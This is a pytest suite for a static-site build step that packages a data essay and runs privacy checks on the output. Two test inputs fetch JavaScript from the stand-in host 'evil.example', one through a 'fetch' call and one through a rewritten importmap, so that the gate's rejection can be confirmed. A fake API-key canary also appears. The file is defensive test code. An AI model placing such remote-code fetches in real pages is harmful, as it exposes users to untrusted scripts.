import json
from pathlib import Path

import pytest

from atlas.story.dist import DistError, build_dist

REPO = Path(__file__).resolve().parents[2]

INDEX = """<!doctype html>
<html><head>
<script type="importmap">
{
  "imports": {
    "d3": "https://cdn.jsdelivr.net/npm/d3@7.9.0/+esm",
    "@observablehq/plot": "https://cdn.jsdelivr.net/npm/@observablehq/plot@0.6.17/+esm"
  }
}
</script>
</head><body><script type="module" src="./app.js"></script></body></html>
"""

STORY = '{"meta": {"schema": "story.v1"}}\n'


def make_essay(tmp_path: Path, story: str = STORY) -> Path:
    essay = tmp_path / "essay"
    for d in ("charts", "lib", "content", "data", "test", "fixtures"):
        (essay / d).mkdir(parents=True)
    (essay / "index.html").write_text(INDEX)
    (essay / "app.js").write_text(
        'fetchJson("data/story.json", "fixtures/story.fixture.json");\n'
    )
    (essay / "style.css").write_text("body { margin: 0; }\n")
    (essay / "charts" / "funnel.js").write_text("export const f = 1;\n")
    (essay / "lib" / "md.js").write_text("export const m = 1;\n")
    (essay / "content" / "story.md").write_text("# Title\n\nProse.\n")
    (essay / "content" / "story.fixture.md").write_text("# Fixture\n")
    (essay / "data" / "story.json").write_text(story)
    (essay / "test" / "x.test.mjs").write_text("import test;\n")
    (essay / "fixtures" / "story.fixture.json").write_text("{}\n")
    return essay


def test_dist_copies_only_publishable_files(tmp_path):
    out = tmp_path / "dist"
    summary = build_dist(out, make_essay(tmp_path))
    assert summary["files"] > 0
    assert (out / "index.html").is_file()
    assert (out / "app.js").is_file()
    assert (out / "style.css").is_file()
    assert (out / "charts" / "funnel.js").is_file()
    assert (out / "lib" / "md.js").is_file()
    assert (out / "content" / "story.md").is_file()
    assert (out / "data" / "story.json").is_file()
    assert not (out / "test").exists()
    assert not (out / "fixtures").exists()
    assert not (out / "content" / "story.fixture.md").exists()


def test_dist_jsdelivr_importmap_passes(tmp_path):
    # The real index.html pulls d3, plot, voronoi-treemap, and scrollama from
    # cdn.jsdelivr.net via its importmap; the gate must allow exactly that.
    build_dist(tmp_path / "dist", make_essay(tmp_path))


def test_dist_missing_story_json_fails(tmp_path):
    essay = make_essay(tmp_path)
    (essay / "data" / "story.json").unlink()
    with pytest.raises(DistError, match="story.json"):
        build_dist(tmp_path / "dist", essay)


def test_dist_missing_story_md_fails(tmp_path):
    essay = make_essay(tmp_path)
    (essay / "content" / "story.md").unlink()
    with pytest.raises(DistError, match="story.md"):
        build_dist(tmp_path / "dist", essay)


def test_dist_story_check_failure_fails(tmp_path):
    bad = json.dumps({"meta": {"schema": "story.v1"}, "notes": "free text here"})
    with pytest.raises(DistError, match="story check"):
        build_dist(tmp_path / "dist", make_essay(tmp_path, story=bad))


def test_dist_email_in_story_json_fails(tmp_path):
    # The email rides in a dict key, which ``story check`` treats as
    # structural, so only the privacy gate can catch it.
    planted = json.dumps(
        {"meta": {"schema": "story.v1"}, "ops": {"dev@example.com": 1}}
    )
    with pytest.raises(DistError, match="privacy"):
        build_dist(tmp_path / "dist", make_essay(tmp_path, story=planted))


def test_dist_local_path_fails(tmp_path):
    essay = make_essay(tmp_path)
    (essay / "app.js").write_text('fetch("/Users/x/data.json");\n')
    with pytest.raises(DistError, match="privacy"):
        build_dist(tmp_path / "dist", essay)


def test_dist_url_outside_importmap_fails(tmp_path):
    essay = make_essay(tmp_path)
    (essay / "app.js").write_text('fetch("https://evil.example/x.js");\n')
    with pytest.raises(DistError, match="privacy"):
        build_dist(tmp_path / "dist", essay)


def test_dist_non_jsdelivr_importmap_fails(tmp_path):
    essay = make_essay(tmp_path)
    (essay / "index.html").write_text(
        INDEX.replace("cdn.jsdelivr.net", "evil.example")
    )
    with pytest.raises(DistError, match="privacy"):
        build_dist(tmp_path / "dist", essay)


def test_dist_secret_fails(tmp_path):
    canary = "apikey_" + "0" * 36 + "_" + "f" * 64
    essay = make_essay(tmp_path)
    (essay / "lib" / "md.js").write_text(f'const k = "{canary}";\n')
    with pytest.raises(DistError, match="SECRET"):
        build_dist(tmp_path / "dist", essay)
